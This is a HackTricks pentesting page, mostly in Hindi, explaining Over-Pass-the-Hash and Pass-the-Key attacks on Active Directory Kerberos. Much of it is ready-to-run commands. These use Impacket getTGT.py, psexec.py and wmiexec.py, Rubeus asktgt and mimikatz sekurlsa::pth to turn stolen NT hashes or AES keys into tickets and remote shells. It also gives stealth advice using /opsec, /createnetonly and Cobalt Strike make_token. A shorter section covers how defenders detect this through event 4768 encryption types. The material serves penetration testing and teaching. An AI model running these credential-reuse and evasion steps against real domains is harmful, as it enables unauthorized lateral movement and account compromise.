# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

**Overpass The Hash/Pass The Key (PTK)** attack ऐसे environments के लिए designed है जहाँ traditional NTLM protocol restricted होता है, और Kerberos authentication को precedence मिलती है। यह attack user के NTLM hash या AES keys का leverage लेकर Kerberos tickets request करता है, जिससे network के भीतर resources तक unauthorized access enable होता है।

Strictly speaking:

- **Over-Pass-the-Hash** usually का मतलब है **NT hash** को **RC4-HMAC** Kerberos key के जरिए Kerberos TGT में बदलना।
- **Pass-the-Key** अधिक generic version है जहाँ आपके पास पहले से **AES128/AES256** जैसा Kerberos key होता है और आप उससे सीधे TGT request करते हैं।

यह difference hardened environments में matters करता है: अगर **RC4 disabled** है या KDC अब उसे assume नहीं करता, तो **NT hash alone पर्याप्त नहीं है** और आपको **AES key** (या उसे derive करने के लिए cleartext password) चाहिए।

इस attack को execute करने के लिए, पहला step targeted user's account का NTLM hash या password हासिल करना होता है। यह information मिल जाने पर, account के लिए एक Ticket Granting Ticket (TGT) प्राप्त किया जा सकता है, जिससे attacker उन services या machines तक access कर सकता है जिन पर user के permissions हैं।

इस process को निम्न commands के साथ शुरू किया जा सकता है:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
ऐसे परिदृश्यों के लिए जिनमें AES256 की आवश्यकता हो, `-aesKey [AES key]` विकल्प का उपयोग किया जा सकता है:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` भी `-service <SPN>` के साथ **AS-REQ** के माध्यम से सीधे **service ticket** अनुरोध करने का समर्थन करता है, जो तब उपयोगी हो सकता है जब आपको अतिरिक्त TGS-REQ के बिना किसी specific SPN के लिए ticket चाहिए:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
इसके अलावा, प्राप्त ticket को `smbexec.py` या `wmiexec.py` सहित विभिन्न tools के साथ उपयोग किया जा सकता है, जिससे attack का दायरा बढ़ जाता है।

_PyAsn1Error_ या _KDC cannot find the name_ जैसी encountered issues आमतौर पर Impacket library को update करके या IP address की बजाय hostname का उपयोग करके हल की जाती हैं, जिससे Kerberos KDC के साथ compatibility सुनिश्चित होती है।

Rubeus.exe का उपयोग करते हुए एक वैकल्पिक command sequence इस technique का एक और पहलू दिखाता है:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
यह method **Pass the Key** approach जैसा है, जिसमें authentication purposes के लिए सीधे ticket को commandeer करने और उपयोग करने पर focus होता है। व्यवहार में:

- `Rubeus asktgt` खुद **raw Kerberos AS-REQ/AS-REP** भेजता है और उसे **admin rights** की जरूरत नहीं होती, जब तक कि आप `/luid` के साथ किसी दूसरे logon session को target करना न चाहें या `/createnetonly` के साथ एक अलग session create न करना चाहें।
- `mimikatz sekurlsa::pth` credential material को एक logon session में patch करता है और इसलिए **LSASS को touch** करता है, जिसके लिए आमतौर पर local admin या `SYSTEM` चाहिए होता है और EDR perspective से यह ज्यादा noisy होता है।

Mimikatz के साथ examples:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Operational security के अनुरूप होने और AES256 का उपयोग करने के लिए, निम्नलिखित command लागू की जा सकती है:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` relevant है क्योंकि Rubeus-generated traffic native Windows Kerberos से थोड़ा अलग होता है। यह भी ध्यान दें कि `/opsec` को **AES256** traffic के लिए intended किया गया है; इसे RC4 के साथ इस्तेमाल करने के लिए अक्सर `/force` चाहिए होता है, जो इसका बड़ा फायदा खत्म कर देता है क्योंकि **modern domains में RC4 खुद एक strong signal है**।

## Detection notes

हर TGT request DC पर **event `4768`** generate करती है। current Windows builds में इस event में older writeups की तुलना में ज़्यादा useful fields होते हैं:

- `TicketEncryptionType` बताता है कि issued TGT के लिए कौन सा enctype इस्तेमाल हुआ। Typical values **RC4-HMAC** के लिए `0x17`, **AES128** के लिए `0x11`, और **AES256** के लिए `0x12` हैं।
- Updated events `SessionKeyEncryptionType`, `PreAuthEncryptionType`, और client के advertised enctypes भी expose करते हैं, जिससे **real RC4 dependence** को confusing legacy defaults से अलग पहचानना आसान होता है।
- Modern environment में `0x17` देखना अच्छा clue है कि account, host, या KDC fallback path अभी भी RC4 allow करता है और इसलिए NT-hash-based Over-Pass-the-Hash के लिए ज़्यादा friendly है।

Microsoft ने November 2022 Kerberos hardening updates के बाद से RC4-by-default behavior को धीरे-धीरे कम किया है, और current published guidance है कि **Q2 2026 के end तक AD DCs के लिए default assumed enctype के रूप में RC4 हटाया जाए**। offensive perspective से इसका मतलब है कि **AES के साथ Pass-the-Key** increasingly reliable path है, जबकि classic **NT-hash-only OpTH** hardened estates में और ज़्यादा बार fail होता रहेगा।

Kerberos encryption types और related ticketing behaviour पर ज़्यादा details के लिए देखें:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Stealthier version

> [!WARNING]
> हर logon session में एक समय पर केवल एक active TGT हो सकता है, इसलिए सावधान रहें।

1. Cobalt Strike से **`make_token`** का उपयोग करके एक नया logon session बनाएं।
2. फिर, existing session को प्रभावित किए बिना नए logon session के लिए TGT generate करने हेतु Rubeus का उपयोग करें।

आप Rubeus के भीतर से भी एक sacrificial **logon type 9** session के साथ similar isolation हासिल कर सकते हैं:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
यह current session TGT को overwrite करने से बचाता है और आमतौर पर ticket को अपने existing logon session में import करने से ज्यादा सुरक्षित होता है।


## References

- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
